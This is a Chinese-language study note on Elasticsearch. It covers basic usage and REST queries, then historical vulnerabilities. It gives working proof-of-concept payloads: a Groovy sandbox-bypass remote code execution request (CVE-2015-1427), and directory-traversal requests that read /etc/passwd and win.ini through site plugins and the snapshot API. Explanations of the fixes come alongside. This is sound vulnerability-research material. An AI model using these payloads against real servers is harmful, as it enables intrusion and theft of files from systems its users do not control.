# ElasticSearch

Elasticsearch是一个开源的搜索引擎，建立在一个全文搜索引擎库Apache Lucene基础之上。Apache Solr也是建立在Lucene上的搜索引擎。Elasticsearch提供了一套RESTful API，所以只支持JSON格式，而Solr则支持多种格式但在实时搜索性能上优于Solr。Elasticsearch是面向文档的存储的，并且使用JSON作为文档的序列化格式。

一个运行中的Elasticsearch实例称为一个节点，而集群是由一个或者多个拥有相同cluster.name配置的节点组成。Elasticsearch使用一种称为倒排索引的结构，它适用于快速的全文搜索。一个倒排索引由文档中所有不重复词的列表构成。

软件安装包下载： https://www.elastic.co/downloads/past-releases

源码下载： https://github.com/elastic/elasticsearch/tags

低版本远程调试： `elasticsearch -D "-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=5556"`

windows下安装：解压下载后的zip文件，进入bin目录，双击elasticsearch.bat。脚本之行完成会显示`started`，浏览器打开`http://localhost:9200`访问到如下格式的信息即安装成功
```
{
  "status" : 200,
  "name" : "Jekyll",
  "cluster_name" : "elasticsearch",
  "version" : {
    "number" : "1.4.2",
    "build_hash" : "927caff6f05403e936c20bf4529f144f0c89fd8c",
    "build_timestamp" : "2014-12-16T14:11:12Z",
    "build_snapshot" : false,
    "lucene_version" : "4.10.2"
  },
  "tagline" : "You Know, for Search"
}
```
除了通过web接口，还可以通过curl来交互(其中，VERB代表HTTP方法，包含GET、 POST、 PUT、 HEAD或者DELETE)
```
curl -X<VERB> '<PROTOCOL>://<HOST>:<PORT>/<PATH>?<QUERY_STRING>' -d '<BODY>'
```

基本概念：
```
文档： 数据的存储形式
索引（动词）： 存储文档到Elasticsearch的行为，类似INSERT。
索引（名词）： 类似传统关系型数据库中的一个数据库。index的复数为indices 或 indexes
```

基本语句
```
# /索引/文档类型/ID 录入信息， 在请求的查询串参数中加上pretty参数，使JSON响应体更加可读。
curl -X PUT "localhost:9200/megacorp/employee/1?pretty" -H 'Content-Type: application/json' -d "{\"first_name\":\"John\",\"last_name\":\"Smith\",\"age\":25,\"about\":\"I love to go rock climbing\",\"interests\":[ \"sports\", \"music\"]}"

# 查询某个ID的数据
curl -X GET "localhost:9200/megacorp/employee/1"

# 查询所有数据
curl -X GET "localhost:9200/megacorp/employee/_search"

# query-string搜索
curl -X GET "localhost:9200/megacorp/employee/_search?q=last_name:Smith"

# 替代query-string的查询表达式，适用于复杂搜索、全文搜索等。如果要对关键词更精准，可以将match替换为match_phrase，即短语搜索
GET /megacorp/employee/_search
{
    "query" : {
        "match" : {
            "last_name" : "Smith"
        }
    }
}

# 聚合分析aggregations，类似group by，可以和match等组合使用
GET /megacorp/employee/_search
{
  "aggs": {
    "all_interests": {
      "terms": { "field": "interests" }
    }
  }
}

# 查询文档中的部分字段
GET /website/blog/123?_source=title,text

# 创建新文档，而不覆盖旧的（不确定已有id的情况），只有在_index、_type和_id都不存在时才创建，否则409
PUT /website/blog/123?op_type=create
PUT /website/blog/123/_create

# 文档的部分更新
POST /website/blog/1/_update
{
   "doc" : {
      "tags" : [ "testing" ],
      "views": 0
   }
}

# 使用脚本（默认为groovy）更新文档，有些版本已禁用脚本，在config/elasticsearch.yml定义script.groovy.sandbox.enabled: false
POST /website/blog/1/_update
{
   "script" : "ctx._source.views+=1"
}

# 分页搜索，类似LIMIT
GET /_search?size=5&from=10
```

一些接口
```
_cluster/health #集群状态
_search #查询所有文档
/索引/类型/_search #具体某个索引类型下搜索所有文档

```

历史漏洞：
|漏洞编号|漏洞类型|影响版本|
|:----:|:----:|:----:|
|CVE-2014-3120|RCE|< 1.2|
|CVE-2015-1427|RCE|< 1.3.8, 1.4.3|
|CVE-2015-3337|目录穿越|< 1.4.5, 1.5.2|
|CVE-2015-5531|目录穿越|< 1.6.1|
|WooYun-2015-110216|目录穿越|< 1.5.1|


## CVE-2015-1427
Ref： https://jordan-wright.com/blog/2015/03/08/elasticsearch-rce-vulnerability-cve-2015-1427/

POC
```
POST /_search?pretty

{"size":1, "script_fields": {"xxx":{"lang":"groovy","script": "java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"whoami\").getText()"}}}
```
这个漏洞的重点在于绕过沙箱。1.3之前的版本可以随意写入Java语句。后来在执行表达式查询时，增加了`GroovySandboxExpressionChecker.isAuthorized()`。
```
public boolean isAuthorized(Expression expression) {
    if (expression instanceof MethodCallExpression) {
        MethodCallExpression mce = (MethodCallExpression) expression;
        String methodName = mce.getMethodAsString(); // poc中得到的methodName为getText
        if (methodBlacklist.contains(methodName)) { // 黑名单包括"getClass"、"wait"、"notify"、"notifyAll"、"finalize"方法
            return false;
        } else if (methodName == null && mce.getMethod() instanceof GStringExpression) {
            // We do not allow GStrings for method invocation, they are a security risk
            return false;
        }
    } else if (expression instanceof ConstructorCallExpression) {
        ConstructorCallExpression cce = (ConstructorCallExpression) expression;
        ClassNode type = cce.getType();
        if (!packageWhitelist.contains(type.getPackageName())) {
            return false;
        }
        if (!classWhitelist.contains(type.getName())) {
            return false;
        }
    }
    return true;
}
```
并且能调用的包设定了白名单
```
java.lang.Math.class.getName(),
java.lang.Integer.class.getName(), "[I", "[[I", "[[[I",
...
java.util.Date.class.getName(),
java.util.List.class.getName(),
java.util.Map.class.getName(),
java.util.Set.class.getName(),
java.lang.Object.class.getName(),
```

## CVE-2015-3337
漏洞需要安装"Site plugins"，较为流行的"Site plugins"包括Head、Kopf等。安装Head插件，在bin文件夹下运行如下命令（限于5.0版本之前）
```
plugin -install mobz/elasticsearch-head
```
访问`http://localhost:9200/_plugin/head/`，查看是否安装成功（无需重启）

POC（不能在浏览器访问）
```
http://localhost:9200/_plugin/head/../../../../../../../../../etc/passwd
http://localhost:9200/_plugin/head/../../../../../../../../Windows/win.ini/
```
修复： https://github.com/elastic/elasticsearch/pull/10815/files
漏洞修复时在`HttpServer.handlePluginSite()`中增加了一条判断`!file.toAbsolutePath().normalize().startsWith(siteFile.toAbsolutePath())`，过滤目录穿越

## CVE-2015-5531
官方描述此漏洞是`read arbitrary files via unspecified vectors related to snapshot API calls`，查看snapshot的官方文档，所谓快照是一种备份的功能，想要制作快照需要先注册存储库（每个存储库都是独立的，数据不共享），然后在存储库中创建快照。官方给出的这两步的API使用demo如下
```
PUT /_snapshot/my_repository
{
  "type": "fs",
  "settings": {
    "location": "my_backup_location"
  }
}

PUT /_snapshot/my_repository/my_snapshot 
```
只需要将location后面随意写个存储位置，然后访问如下网址
```
GET /_snapshot/my_repository/my_snapshot%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fWindows%2fwin.ini/
```
得到如下响应内容
```
HTTP/1.1 400 Bad Request
Content-Type: application/json; charset=UTF-8
Content-Length: 524

{"error":"ElasticsearchParseException[Failed to derive xcontent from (offset=0, length=92): [59, 32, 102, 111, 114, 32, 49, 54, 45, 98, 105, 116, 32, 97, 112, 112, 32, 115, 117, 112, 112, 111, 114, 116, 13, 10, 91, 102, 111, 110, 116, 115, 93, 13, 10, 91, 101, 120, 116, 101, 110, 115, 105, 111, 110, 115, 93, 13, 10, 91, 109, 99, 105, 32, 101, 120, 116, 101, 110, 115, 105, 111, 110, 115, 93, 13, 10, 91, 102, 105, 108, 101, 115, 93, 13, 10, 91, 77, 97, 105, 108, 93, 13, 10, 77, 65, 80, 73, 61, 49, 13, 10]]","status":400}
```
将error中的ascii码进行解码，例如可以在chrome的console中利用`String.fromCharCode(ascii)`来解码，得到真实内容

## WooYun-2015-110216
Ref： http://wooyun.2xss.cc/bug_detail.php?wybug_id=wooyun-2015-0110216
